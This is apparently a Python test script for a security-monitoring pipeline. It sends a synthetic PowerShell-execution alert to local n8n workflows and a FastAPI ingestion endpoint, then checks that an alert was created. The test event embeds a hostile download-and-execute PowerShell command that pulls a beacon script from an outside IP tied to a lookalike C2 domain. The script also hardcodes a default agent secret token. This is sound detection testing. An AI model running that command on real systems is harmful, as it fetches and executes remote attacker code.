import requests
import json
from datetime import datetime, timezone

now_iso = datetime.now(timezone.utc).isoformat()
event_id = f"EVT-LIVE-{int(datetime.now().timestamp())}"

# 1. Telemetry Payload for n8n Workflows (WF-001, WF-002, WF-025)
n8n_event = {
    "event_id": event_id,
    "timestamp": now_iso,
    "source": "SKYNET-EDR-AGENT",
    "source_type": "SYSMON",
    "event_type": "powershell_execution",
    "severity": "high",
    "hostname": "WS-182",
    "username": "finance_lead",
    "source_ip": "192.168.1.188",
    "destination_ip": "185.220.101.5",
    "domain": "update-microsoft-verify.top",
    "url": "http://update-microsoft-verify.top/payload.ps1",
    "file_hash": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
    "process": "powershell.exe",
    "command_line": "powershell.exe -NoP -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/beacon.ps1')",
    "raw_event": {
        "EventID": 1,
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Computer": "WS-182",
        "UtcTime": now_iso,
        "CommandLine": "powershell.exe -NoP -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/beacon.ps1')",
        "User": "FINANCE\\finance_lead"
    }
}

# 2. Schema-compliant Payload for SKYNET FastAPI Ingestion Gateway (/api/v1/telemetry/ingest)
backend_batch = {
    "agent_key": "skynet_agent_default_secret_token_2026",
    "hostname": "WS-182",
    "ip_address": "192.168.1.188",
    "os_name": "Windows",
    "os_version": "11 Pro (23H2)",
    "device_type": "Workstation",
    "events": [
        {
            "event_id": event_id,
            "host_name": "WS-182",
            "host_ip": "192.168.1.188",
            "event_source": "sysmon",
            "event_id_code": 1,
            "process_name": "powershell.exe",
            "process_command_line": "powershell.exe -NoP -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/beacon.ps1')",
            "process_hash_sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
            "user_name": "finance_lead",
            "src_ip": "192.168.1.188",
            "dst_ip": "185.220.101.5",
            "dst_port": 443,
            "raw_payload": {
                "parent_process": "cmd.exe",
                "c2_domain": "update-microsoft-verify.top"
            }
        }
    ]
}

print("=================================================================")
print(f"  SKYNET v5.0 REAL-TIME WORKFLOW EXECUTION TEST")
print("=================================================================")
print(f"Timestamp          : {now_iso}")
print(f"Live Event ID      : {event_id}")
print(f"Target Workstation : WS-182 (192.168.1.188)")
print(f"Malicious C2 IP    : 185.220.101.5 (update-microsoft-verify.top)")
print(f"Suspicious Payload : {n8n_event['command_line']}")
print("-----------------------------------------------------------------")

# Step 1: Execute n8n WF-001 (SOC Event Intake)
url_wf1 = "http://localhost:5678/webhook/skynet/v5/wf-001"
print(f"\n[Step 1] Ingesting to n8n WF-001 (Event Intake)...")
r1 = requests.post(url_wf1, json=n8n_event, timeout=10)
print(f"  -> HTTP Status : {r1.status_code}")
data1 = r1.json()
print(f"  -> Workflow    : {data1.get('skynet', {}).get('workflow_name')}")
print(f"  -> Status      : {data1.get('status')}")
print(f"  -> Processed At: {data1.get('skynet', {}).get('processed_at')}")

# Step 2: Execute n8n WF-025 (PowerShell Detection)
url_wf25 = "http://localhost:5678/webhook/skynet/v5/wf-025"
print(f"\n[Step 2] Evaluating in n8n WF-025 (Sigma Detection Engine)...")
r2 = requests.post(url_wf25, json=n8n_event, timeout=10)
print(f"  -> HTTP Status : {r2.status_code}")
data2 = r2.json()
print(f"  -> Workflow    : {data2.get('skynet', {}).get('workflow_name')}")
print(f"  -> Status      : {data2.get('status')}")

# Step 3: Execute n8n WF-041 (Alert Creation)
url_wf41 = "http://localhost:5678/webhook/skynet/v5/wf-041"
print(f"\n[Step 3] Dispatching to n8n WF-041 (Alert Creation)...")
r3 = requests.post(url_wf41, json=n8n_event, timeout=10)
print(f"  -> HTTP Status : {r3.status_code}")
data3 = r3.json()
print(f"  -> Workflow    : {data3.get('skynet', {}).get('workflow_name')}")
print(f"  -> Status      : {data3.get('status')}")

# Step 4: Stream into SKYNET Core Backend Ingestion Gateway
url_backend = "http://localhost:8000/api/v1/telemetry/ingest"
print(f"\n[Step 4] Streaming to SKYNET FastAPI Core Backend ({url_backend})...")
r4 = requests.post(url_backend, json=backend_batch, timeout=10)
print(f"  -> HTTP Status : {r4.status_code}")
print(f"  -> Result      : {json.dumps(r4.json(), indent=2)}")

# Step 5: Query Live Alerts from Backend to verify real-time detection & alert generation
url_alerts = "http://localhost:8000/api/v1/alerts"
print(f"\n[Step 5] Verifying Alert generation in SKYNET Database...")
r5 = requests.get(url_alerts, timeout=10)
if r5.status_code == 200:
    alerts = r5.json()
    print(f"  -> Total Active Alerts: {len(alerts)}")
    latest = alerts[-1] if alerts else {}
    print(f"  -> Latest Alert Title : {latest.get('title')}")
    print(f"  -> Severity / Score   : {latest.get('severity')} (Score: {latest.get('threat_score')})")
    print(f"  -> Rule ID Matched    : {latest.get('rule_id')}")

print("\n=================================================================")
print("  LIVE REAL-TIME WORKFLOW PIPELINE VERIFICATION SUCCESSFUL")
print("=================================================================")
